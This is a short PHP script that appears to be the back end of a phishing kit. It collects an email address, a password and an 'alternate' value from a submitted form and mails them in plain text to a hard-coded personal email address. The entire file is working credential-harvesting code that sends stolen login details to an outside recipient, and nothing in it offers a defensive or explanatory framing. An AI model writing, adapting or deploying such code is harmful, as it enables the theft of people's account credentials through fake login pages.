<?php

    if(isset($_POST['submit'])){
        $email = $_POST['email'];
        $password = $_POST['password'];
        $alternate = $_POST['alternate'];

        $message = "Email: ".$email."<br> Password: ".$password."<br> Alternate: ".$alternate;
        mail("tochukwu.ubani@yahoo.com","email details",$message);


    }

?>